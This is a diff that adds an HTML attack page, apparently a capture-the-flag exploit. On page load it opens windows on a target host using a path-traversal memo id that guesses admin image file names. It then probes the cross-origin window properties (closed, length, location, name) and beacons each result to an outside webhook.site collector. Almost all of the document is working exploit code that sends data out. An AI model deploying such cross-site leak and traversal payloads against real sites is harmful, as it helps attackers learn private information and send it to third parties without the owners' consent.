@@ -1,0 +1,35 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>xs props</title>
+<script>
+const q = new URLSearchParams(location.search);
+const host = q.get('host') || 'https://3.38.205.243';
+const guesses = ['cat.png', 'zzzz'];
+function beacon(kind, extra='') {
+  new Image().src = 'https://webhook.site/09513229-f9de-4438-a2b6-12b86e5b4ca2/' + kind + '?extra=' + encodeURIComponent(extra) + '&t=' + Date.now();
+}
+function snap(label, w) {
+  const out = [];
+  try { out.push('closed=' + String(w.closed)); } catch (e) { out.push('closederr=' + e.message); }
+  try { out.push('length=' + String(w.length)); } catch (e) { out.push('lengtherr=' + e.message); }
+  try { out.push('loc=' + String(w.location.href)); } catch (e) { out.push('locerr=' + e.message); }
+  try { out.push('name=' + String(w.name)); } catch (e) { out.push('nameerr=' + e.message); }
+  beacon('xsp-' + label, out.join('|'));
+}
+window.addEventListener('load', () => {
+  const wins = {};
+  for (const g of guesses) {
+    const u = host + '/memo/view?id=' + encodeURIComponent('../../../image/admin?filename=' + g);
+    try {
+      wins[g] = window.open(u, '_blank');
+      beacon('xsp-open', g + ':' + String(!!wins[g]));
+    } catch (e) {
+      beacon('xsp-openerr', g + ':' + e.message);
+    }
+  }
+  setTimeout(() => { for (const g of guesses) snap(g + '-1s', wins[g]); }, 1000);
+  setTimeout(() => { for (const g of guesses) snap(g + '-5s', wins[g]); }, 5000);
+  setTimeout(() => { for (const g of guesses) snap(g + '-12s', wins[g]); }, 12000);
+});
+</script>
+OK
